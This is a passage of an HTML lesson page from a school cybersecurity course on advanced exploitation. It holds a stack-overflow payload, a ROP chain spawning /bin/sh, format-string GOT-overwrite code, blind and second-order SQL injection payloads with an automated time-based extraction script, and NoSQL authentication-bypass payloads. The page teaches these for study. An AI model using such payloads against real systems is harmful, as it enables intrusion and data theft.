@@ -1,0 +1,2118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lesson 9.2 - NCHS Cybersecurity</title>
+    
+    
+    <link rel="icon" href="../../../img/logo.png">
+    
+    
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+    
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DRPQMPQQS6"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-DRPQMPQQS6');
+    </script>
+    
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg-primary: #0a0e27;
+            --bg-secondary: #141b3a;
+            --text-primary: #00ff41;
+            --text-secondary: #7affa7;
+            --text-muted: #4a9960;
+            --accent: #ff0844;
+            --accent-secondary: #00d4ff;
+            --border: #1a3a2a;
+        }
+
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: var(--bg-primary);
+            color: var(--text-secondary);
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+
+        /* Navigation */
+        nav {
+            background: var(--bg-secondary);
+            border-bottom: 2px solid var(--text-primary);
+            padding: 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            box-shadow: 0 4px 20px rgba(0, 255, 65, 0.2);
+        }
+
+        .nav-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 30px;
+        }
+
+        .nav-logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .nav-logo img {
+            height: 40px;
+            width: auto;
+        }
+
+        .nav-logo a {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--text-primary);
+            text-decoration: none;
+            letter-spacing: 0.1em;
+            text-shadow: 0 0 10px var(--text-primary);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+            list-style: none;
+            align-items: center;
+        }
+
+        .nav-links > li {
+            position: relative;
+        }
+
+        .nav-links a {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            padding: 8px 15px;
+            border-radius: 4px;
+            display: block;
+        }
+
+        .nav-links a:hover,
+        .nav-links a.active {
+            color: var(--text-primary);
+            background: rgba(0, 255, 65, 0.1);
+            text-shadow: 0 0 10px var(--text-primary);
+        }
+
+        /* Dropdown menu */
+        .nav-links .dropdown {
+            position: relative;
+        }
+
+        .nav-links .dropdown > a::after {
+            content: ' ▼';
+            font-size: 0.7em;
+            margin-left: 5px;
+        }
+
+        .nav-links .dropdown-content {
+            display: none;
+            position: absolute;
+            top: 100%;
+            left: 0;
+            background: var(--bg-secondary);
+            border: 2px solid var(--text-primary);
+            border-radius: 4px;
+            min-width: 250px;
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.3);
+            z-index: 1000;
+            padding: 10px 0;
+            margin-top: 5px;
+        }
+
+        .nav-links .dropdown:hover .dropdown-content {
+            display: block;
+        }
+
+        .nav-links .dropdown-content li {
+            list-style: none;
+        }
+
+        .nav-links .dropdown-content a {
+            padding: 10px 20px;
+            border-radius: 0;
+        }
+
+        .nav-links .dropdown-content .nested {
+            padding-left: 0;
+        }
+
+        .nav-links .dropdown-content .nested > strong {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            user-select: none;
+        }
+
+        .nav-links .dropdown-content .nested > strong:hover {
+            background: rgba(0, 255, 65, 0.1);
+        }
+
+        .nav-links .dropdown-content .nested > strong::after {
+            content: '▼';
+            font-size: 0.8em;
+            transition: transform 0.3s ease;
+            color: var(--text-primary);
+        }
+
+        .nav-links .dropdown-content .nested.collapsed > strong::after {
+            transform: rotate(-90deg);
+        }
+
+        .nav-links .dropdown-content .nested .unit-lessons {
+            max-height: 500px;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+        }
+
+        .nav-links .dropdown-content .nested.collapsed .unit-lessons {
+            max-height: 0;
+        }
+
+        .nav-links .dropdown-content .nested .unit-lessons li {
+            padding-left: 20px;
+        }
+
+        .nav-links .dropdown-content .nested a {
+            padding: 8px 20px;
+            font-size: 0.9em;
+            color: var(--text-muted);
+        }
+
+        .nav-links .dropdown-content .nested a:hover {
+            color: var(--text-primary);
+            background: rgba(0, 255, 65, 0.05);
+        }
+
+        /* Mobile menu toggle */
+        .nav-toggle {
+            display: none;
+            background: none;
+            border: 2px solid var(--text-primary);
+            color: var(--text-primary);
+            padding: 8px 15px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+
+        /* Search */
+        .search-container {
+            position: relative;
+            margin-left: 20px;
+        }
+
+        .search-input {
+            padding: 8px 35px 8px 15px;
+            background: var(--bg-primary);
+            border: 2px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            width: 250px;
+            transition: all 0.3s ease;
+        }
+
+        .search-input:focus {
+            outline: none;
+            border-color: var(--text-primary);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+        }
+
+        .search-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .search-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-muted);
+            pointer-events: none;
+        }
+
+        .search-results {
+            position: absolute;
+            top: calc(100% + 10px);
+            left: 0;
+            right: 0;
+            background: var(--bg-secondary);
+            border: 2px solid var(--text-primary);
+            border-radius: 8px;
+            max-height: 400px;
+            overflow-y: auto;
+            display: none;
+            z-index: 2000;
+            box-shadow: 0 8px 30px rgba(0, 255, 65, 0.3);
+        }
+
+        .search-results.active {
+            display: block;
+        }
+
+        .search-result-item {
+            padding: 15px;
+            border-bottom: 1px solid var(--border);
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .search-result-item:last-child {
+            border-bottom: none;
+        }
+
+        .search-result-item:hover {
+            background: rgba(0, 255, 65, 0.05);
+        }
+
+        .search-result-title {
+            color: var(--text-primary);
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .search-result-path {
+            color: var(--text-muted);
+            font-size: 0.8rem;
+            margin-bottom: 8px;
+        }
+
+        .search-result-excerpt {
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            line-height: 1.4;
+        }
+
+        .search-highlight {
+            background: var(--text-primary);
+            color: var(--bg-primary);
+            padding: 2px 4px;
+            border-radius: 2px;
+            font-weight: 700;
+        }
+
+        .search-no-results {
+            padding: 20px;
+            text-align: center;
+            color: var(--text-muted);
+        }
+
+        .search-results::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .search-results::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+
+        .search-results::-webkit-scrollbar-thumb {
+            background: var(--text-primary);
+            border-radius: 4px;
+        }
+
+        /* Main Content */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 30px;
+        }
+
+        /* Typography */
+        h1, h2, h3, h4, h5, h6 {
+            font-family: 'Orbitron', sans-serif;
+            color: var(--text-primary);
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            font-weight: 700;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            text-shadow: 0 0 20px var(--text-primary);
+            letter-spacing: 0.05em;
+            border-bottom: 2px solid var(--text-primary);
+            padding-bottom: 15px;
+        }
+
+        h2 {
+            font-size: 2rem;
+            border-left: 4px solid var(--text-primary);
+            padding-left: 15px;
+        }
+
+        h3 { font-size: 1.5rem; }
+        h4 { font-size: 1.25rem; }
+
+        p {
+            margin-bottom: 1.2rem;
+            color: var(--text-secondary);
+        }
+
+        a {
+            color: var(--accent-secondary);
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        a:hover {
+            color: var(--text-primary);
+            text-shadow: 0 0 10px var(--text-primary);
+        }
+
+        /* Code Blocks */
+        code {
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+            padding: 2px 8px;
+            border-radius: 4px;
+            border: 1px solid var(--border);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        pre {
+            background: var(--bg-secondary);
+            border: 2px solid var(--text-primary);
+            border-radius: 8px;
+            padding: 20px;
+            overflow-x: auto;
+            margin: 20px 0;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
+        }
+
+        pre code {
+            background: transparent;
+            border: none;
+            padding: 0;
+        }
+
+        /* Lists */
+        ul, ol {
+            margin-left: 30px;
+            margin-bottom: 1.2rem;
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+            color: var(--text-secondary);
+        }
+
+        li::marker {
+            color: var(--text-primary);
+        }
+
+        /* Tables */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+        }
+
+        th {
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            padding: 12px;
+            text-align: left;
+            border: 1px solid var(--text-primary);
+            font-weight: 700;
+        }
+
+        td {
+            padding: 12px;
+            border: 1px solid var(--border);
+        }
+
+        tr:hover {
+            background: rgba(0, 255, 65, 0.05);
+        }
+
+        /* Blockquotes */
+        blockquote {
+            border-left: 4px solid var(--text-primary);
+            background: var(--bg-secondary);
+            padding: 15px 20px;
+            margin: 20px 0;
+            font-style: italic;
+        }
+
+        /* Images */
+        img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            margin: 20px 0;
+        }
+
+        /* Horizontal Rule */
+        hr {
+            border: none;
+            border-top: 2px solid var(--text-primary);
+            margin: 30px 0;
+            opacity: 0.3;
+        }
+
+        /* Footer */
+        footer {
+            background: var(--bg-secondary);
+            border-top: 2px solid var(--text-primary);
+            padding: 30px;
+            margin-top: 60px;
+            text-align: center;
+            color: var(--text-muted);
+        }
+
+        /* Scanline Effect */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(
+                to bottom,
+                transparent 50%,
+                rgba(0, 255, 65, 0.02) 51%
+            );
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 9999;
+            animation: scan 8s linear infinite;
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100%); }
+        }
+
+        /* Selection */
+        ::selection {
+            background: var(--text-primary);
+            color: var(--bg-primary);
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 12px;
+            background: var(--bg-primary);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--text-primary);
+            border-radius: 6px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--text-secondary);
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .nav-toggle {
+                display: block;
+            }
+
+            .nav-links {
+                display: none;
+                position: absolute;
+                top: 100%;
+                left: 0;
+                right: 0;
+                background: var(--bg-secondary);
+                flex-direction: column;
+                padding: 20px;
+                border-bottom: 2px solid var(--text-primary);
+            }
+
+            .nav-links.active {
+                display: flex;
+            }
+
+            h1 {
+                font-size: 2rem;
+            }
+
+            .container {
+                padding: 20px 15px;
+            }
+
+            .search-container {
+                margin-left: 10px;
+            }
+
+            .search-input {
+                width: 200px;
+            }
+        }
+
+        /* Search Box */
+        .search-box {
+            padding: 10px;
+            background: var(--bg-primary);
+            border: 1px solid var(--text-primary);
+            border-radius: 4px;
+            color: var(--text-primary);
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .search-box::placeholder {
+            color: var(--text-muted);
+        }
+
+        /* Lesson Navigation */
+        .lesson-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 60px 0 40px 0;
+            padding: 30px;
+            background: var(--bg-secondary);
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+
+        .lesson-nav-button {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 15px 30px;
+            background: var(--bg-primary);
+            border: 2px solid var(--text-primary);
+            border-radius: 8px;
+            color: var(--text-primary);
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .lesson-nav-button:hover {
+            background: var(--text-primary);
+            color: var(--bg-primary);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(0, 255, 65, 0.3);
+        }
+
+        .lesson-nav-button.disabled {
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
+        .lesson-nav-button .arrow {
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        .lesson-nav-info {
+            text-align: center;
+            color: var(--text-secondary);
+        }
+
+        .lesson-nav-info .current-lesson {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-bottom: 5px;
+        }
+
+        .lesson-nav-info .lesson-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        @media (max-width: 768px) {
+            .lesson-nav {
+                flex-direction: column;
+                gap: 20px;
+            }
+
+            .lesson-nav-button {
+                width: 100%;
+                justify-content: center;
+            }
+
+            .lesson-nav-info {
+                order: -1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="nav-container">
+            <div class="nav-logo">
+                
+                <img src="../../../img/logo.png" alt="Logo">
+                
+                <a href="https://mohamed-morsy33.github.io/cybersecuritynchs/">NCHS Cybersecurity</a>
+            </div>
+            
+            <button class="nav-toggle" onclick="toggleMenu()">MENU</button>
+            
+            <ul class="nav-links" id="navLinks">
+                
+                <li >
+                    
+                        <a href="../../.." 
+                           >
+                            Home
+                        </a>
+                    
+                </li>
+                
+                <li class="dropdown">
+                    
+                        <a href="#">Curriculum</a>
+                        <ul class="dropdown-content">
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 1</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../../unit1/lesson1-1/">Lesson 1.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit1/lesson1-2/">Lesson 1.2</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit1/lesson1-3/">Lesson 1.3</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit1/lesson1-4/">Lesson 1.4</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit1/lesson1-5/">Lesson 1.5</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit1/lesson1-6/">Lesson 1.6</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit1/installation-process/">Linux Installation Process</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 2</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../../unit2/lesson2-1/">Lesson 2.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit2/lesson2-2/">Lesson 2.2</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit2/lesson2-3/">Lesson 2.3</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 3</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../../unit3/lesson3-1/">Lesson 3.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit3/lesson3-2/">Lesson 3.2</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit3/lesson3-3/">Lesson 3.3</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 4</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../../unit4/lesson4-1/">Lesson 4.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit4/lesson4-2/">Lesson 4.2</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 5</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../../unit5/lesson5-1/">Lesson 5.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit5/lesson5-2/">Lesson 5.2</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit5/lesson5-3/">Lesson 5.3</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 6</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../../unit6/lesson6-1/">Lesson 6.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit6/lesson6-2/">Lesson 6.2</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit6/lesson6-3/">Lesson 6.3</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 7</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../../unit7/lesson7-1/">Lesson 7.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit7/lesson7-2/">Lesson 7.2</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit7/lesson7-3/">Lesson 7.3</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 8</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../../unit8/lesson8-1/">Lesson 8.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit8/lesson8-2/">Lesson 8.2</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit8/lesson8-3/">Lesson 8.3</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 9</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../lesson9-1/">Lesson 9.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="./">Lesson 9.2</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../lesson9-3/">Lesson 9.3</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 10</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../../unit10/lesson10-1/">Lesson 10.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit10/lesson10-2/">Lesson 10.2</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit10/lesson10-3/">Lesson 10.3</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                                
+                                    <li class="nested collapsed">
+                                        <strong>Unit 11</strong>
+                                        <ul class="unit-lessons">
+                                            
+                                            <li>
+                                                <a href="../../unit11/lesson11-1/">Lesson 11.1</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit11/lesson11-2/">Lesson 11.2</a>
+                                            </li>
+                                            
+                                            <li>
+                                                <a href="../../unit11/lesson11-3/">Lesson 11.3</a>
+                                            </li>
+                                            
+                                        </ul>
+                                    </li>
+                                
+                            
+                        </ul>
+                    
+                </li>
+                
+                <li >
+                    
+                        <a href="../../../test/" 
+                           >
+                            Terminal
+                        </a>
+                    
+                </li>
+                
+            </ul>
+
+            <div class="search-container">
+                <input type="text" 
+                       class="search-input" 
+                       id="searchInput" 
+                       placeholder="Search lessons..."
+                       autocomplete="off">
+                <span class="search-icon">🔍</span>
+                <div class="search-results" id="searchResults"></div>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        
+        <h1 id="advanced-exploitation-techniques">Advanced Exploitation Techniques</h1>
+<p>Beyond basic attacks, sophisticated threat actors use advanced exploitation techniques to compromise systems, evade detection, and maintain persistence. This lesson explores modern exploitation methods used in real-world attacks.</p>
+<h2 id="memory-corruption-exploits">Memory Corruption Exploits</h2>
+<h3 id="buffer-overflows">Buffer Overflows</h3>
+<p><strong>How it works:</strong>
+Program writes data beyond buffer boundary, overwriting adjacent memory.</p>
+<p><strong>Stack buffer overflow example:</strong></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+void vulnerable_function(char *input) {
+    char buffer[64];
+    strcpy(buffer, input);  // No bounds checking!
+    printf(&quot;Input: %s\n&quot;, buffer);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc &gt; 1) {
+        vulnerable_function(argv[1]);
+    }
+    return 0;
+}
+</code></pre>
+<p><strong>Exploitation:</strong></p>
+<pre><code class="language-python">import struct
+
+# Create payload
+buffer_size = 64
+padding = b&quot;A&quot; * buffer_size
+
+# Overwrite saved EIP (return address)
+# This is the address we want to jump to
+new_eip = struct.pack(&quot;&lt;I&quot;, 0x08048484)  # Address of shellcode
+
+# Add shellcode (or ROP chain)
+shellcode = b&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68...&quot;
+
+payload = padding + new_eip + shellcode
+print(payload)
+</code></pre>
+<p><strong>Modern protections:</strong>
+- <strong>ASLR (Address Space Layout Randomization)</strong>: Randomizes memory locations
+- <strong>DEP/NX (Data Execution Prevention)</strong>: Marks stack as non-executable
+- <strong>Stack canaries</strong>: Detects buffer overflow before return
+- <strong>RELRO</strong>: Makes GOT read-only</p>
+<h3 id="return-oriented-programming-rop">Return-Oriented Programming (ROP)</h3>
+<p><strong>Bypasses DEP/NX by reusing existing code.</strong></p>
+<p><strong>How it works:</strong>
+- Find "gadgets" (instruction sequences ending in <code>ret</code>)
+- Chain gadgets together
+- Execute existing code in new order</p>
+<p><strong>Example gadgets:</strong></p>
+<pre><code class="language-assembly">; Gadget 1: pop rdi; ret
+0x00401234: pop rdi
+0x00401235: ret
+
+; Gadget 2: pop rsi; ret
+0x00401240: pop rsi
+0x00401241: ret
+
+; Gadget 3: syscall; ret
+0x00401250: syscall
+0x00401251: ret
+</code></pre>
+<p><strong>ROP chain to call execve("/bin/sh", NULL, NULL):</strong></p>
+<pre><code class="language-python">import struct
+
+def p64(addr):
+    return struct.pack(&quot;&lt;Q&quot;, addr)
+
+# Build ROP chain
+rop_chain = b&quot;&quot;
+rop_chain += p64(0x00401234)  # pop rdi; ret
+rop_chain += p64(0x00601234)  # address of &quot;/bin/sh&quot;
+rop_chain += p64(0x00401240)  # pop rsi; ret
+rop_chain += p64(0x0)         # NULL
+rop_chain += p64(0x00401245)  # pop rdx; ret
+rop_chain += p64(0x0)         # NULL
+rop_chain += p64(0x00401250)  # syscall; ret
+
+payload = b&quot;A&quot; * 72 + rop_chain
+</code></pre>
+<p><strong>Finding gadgets:</strong></p>
+<pre><code class="language-bash"># Using ROPgadget
+ROPgadget --binary vulnerable_binary
+
+# Using ropper
+ropper --file vulnerable_binary --search &quot;pop rdi&quot;
+</code></pre>
+<h3 id="heap-exploitation">Heap Exploitation</h3>
+<p><strong>Heap overflow:</strong>
+Overwrite heap metadata to control allocations.</p>
+<p><strong>Use-after-free:</strong>
+Access memory after it's been freed.</p>
+<pre><code class="language-c">// Use-after-free vulnerability
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+struct object {
+    void (*function_pointer)(void);
+    char data[64];
+};
+
+void legitimate_function() {
+    printf(&quot;Normal operation\n&quot;);
+}
+
+void evil_function() {
+    printf(&quot;Compromised!\n&quot;);
+    // Execute shellcode
+}
+
+int main() {
+    struct object *obj = malloc(sizeof(struct object));
+    obj-&gt;function_pointer = legitimate_function;
+    strcpy(obj-&gt;data, &quot;Some data&quot;);
+
+    // Use object
+    obj-&gt;function_pointer();
+
+    // Free object
+    free(obj);
+
+    // VULNERABILITY: Still have pointer to freed memory
+    // Attacker can allocate new memory in same location
+    // and control function_pointer
+
+    // Later use (after free)
+    obj-&gt;function_pointer();  // Now calls attacker-controlled address
+
+    return 0;
+}
+</code></pre>
+<p><strong>Exploitation:</strong>
+1. Trigger use-after-free
+2. Allocate new object in freed location
+3. Control function pointer
+4. Trigger function call</p>
+<h2 id="format-string-vulnerabilities">Format String Vulnerabilities</h2>
+<p><strong>Occurs when user input is used as format string.</strong></p>
+<p><strong>Vulnerable code:</strong></p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+
+void vulnerable(char *input) {
+    printf(input);  // VULNERABLE!
+}
+
+// Should be:
+// printf(&quot;%s&quot;, input);
+</code></pre>
+<p><strong>Exploitation capabilities:</strong></p>
+<p><strong>Read memory:</strong></p>
+<pre><code class="language-bash"># %x reads from stack
+./vulnerable &quot;%x %x %x %x&quot;
+
+# %s reads string from address
+./vulnerable &quot;%s&quot; 
+
+# Direct parameter access
+./vulnerable &quot;%10$x&quot;  # Reads 10th parameter
+</code></pre>
+<p><strong>Write memory:</strong></p>
+<pre><code class="language-bash"># %n writes number of bytes printed so far
+./vulnerable &quot;AAAA%n&quot;  # Writes 4 to address AAAA
+
+# Write arbitrary value
+./vulnerable &quot;%100x%n&quot;  # Writes 100
+
+# Write to specific address
+./vulnerable &quot;\x04\x03\x02\x01%10$n&quot;
+</code></pre>
+<p><strong>Exploitation example:</strong></p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import struct
+
+def p32(addr):
+    return struct.pack(&quot;&lt;I&quot;, addr)
+
+# Target: overwrite GOT entry for printf
+got_printf = 0x08049a30
+shellcode_addr = 0xbffff700
+
+# Calculate values to write
+value_to_write = shellcode_addr
+
+# Build exploit
+exploit = b&quot;&quot;
+exploit += p32(got_printf)      # Address to write to
+exploit += p32(got_printf + 1)  # Write to each byte
+exploit += p32(got_printf + 2)
+exploit += p32(got_printf + 3)
+
+# Use %n to write values
+exploit += b&quot;%12$n&quot;   # Write to first address
+# ... (calculate proper widths for each byte)
+
+print(exploit)
+</code></pre>
+<h2 id="sql-injection-advanced">SQL Injection - Advanced</h2>
+<h3 id="second-order-sql-injection">Second-Order SQL Injection</h3>
+<p><strong>Data is stored, then later used in SQL query.</strong></p>
+<p><strong>Example:</strong></p>
+<pre><code class="language-python"># First request - store malicious data
+username = &quot;admin'--&quot;
+db.execute(&quot;INSERT INTO users (username) VALUES (?)&quot;, (username,))
+
+# Second request - vulnerable query uses stored data
+stored_username = db.execute(&quot;SELECT username FROM users WHERE id=1&quot;).fetchone()[0]
+# stored_username is now &quot;admin'--&quot;
+
+# VULNERABLE: Uses stored data without sanitization
+results = db.execute(f&quot;SELECT * FROM posts WHERE author='{stored_username}'&quot;)
+# Becomes: SELECT * FROM posts WHERE author='admin'--'
+</code></pre>
+<p><strong>Prevention:</strong> Sanitize data on output, not just input.</p>
+<h3 id="blind-sql-injection">Blind SQL Injection</h3>
+<p><strong>No direct output, must infer results.</strong></p>
+<p><strong>Time-based blind SQLi:</strong></p>
+<pre><code class="language-sql">-- If condition true, delay 5 seconds
+' OR IF(1=1, SLEEP(5), 0)--
+
+-- Extract database name character by character
+' OR IF(SUBSTRING(DATABASE(),1,1)='a', SLEEP(5), 0)--
+' OR IF(SUBSTRING(DATABASE(),1,1)='b', SLEEP(5), 0)--
+-- ... continue for each character
+</code></pre>
+<p><strong>Boolean-based blind SQLi:</strong></p>
+<pre><code class="language-sql">-- Test if condition is true
+' AND 1=1--  (page loads normally)
+' AND 1=2--  (page different or error)
+
+-- Extract data bit by bit
+' AND ASCII(SUBSTRING(DATABASE(),1,1))&gt;97--
+' AND ASCII(SUBSTRING(DATABASE(),1,1))&gt;109--
+-- Binary search to find exact value
+</code></pre>
+<p><strong>Automated extraction:</strong></p>
+<pre><code class="language-python">import requests
+import time
+
+def extract_database_name(url):
+    db_name = &quot;&quot;
+    position = 1
+
+    while True:
+        found_char = False
+
+        # Try each character
+        for ascii_val in range(32, 127):
+            payload = f&quot;' AND ASCII(SUBSTRING(DATABASE(),{position},1))={ascii_val}--&quot;
+
+            start = time.time()
+            response = requests.get(url, params={'id': payload})
+            duration = time.time() - start
+
+            # If response delayed, character is correct
+            if duration &gt; 5:
+                db_name += chr(ascii_val)
+                position += 1
+                found_char = True
+                print(f&quot;Found: {db_name}&quot;)
+                break
+
+        if not found_char:
+            break
+
+    return db_name
+
+# Usage
+db = extract_database_name(&quot;http://example.com/page.php&quot;)
+print(f&quot;Database name: {db}&quot;)
+</code></pre>
+<h3 id="nosql-injection">NoSQL Injection</h3>
+<p><strong>Targets MongoDB, CouchDB, etc.</strong></p>
+<p><strong>Example (MongoDB):</strong></p>
+<pre><code class="language-javascript">// Vulnerable query
+db.users.find({
+    username: req.body.username,
+    password: req.body.password
+})
+
+// Attack payload
+username[$ne]=null&amp;password[$ne]=null
+
+// Becomes: Find where username != null AND password != null
+// Returns all users!
+</code></pre>
+<p><strong>More examples:</strong></p>
+<pre><code class="language-javascript">// Bypass authentication
+{&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null}}
+
+// Extract data
+{&quot;username&quot;: {&quot;$regex&quot;: &quot;^admin&quot;}}  // Starts with &quot;admin&quot;
+{&quot;username&quot;: {&quot;$regex&quot;: &quot;^a&quot;}}      // Starts with &quot;a&quot;
+
+// JavaScript injection (if allowed)
+{&quot;$where&quot;: &quot;this.username == 'admin' || '1'=='1'&quot;}
+</code></pre>
+<p><strong>Prevention:</strong></p>
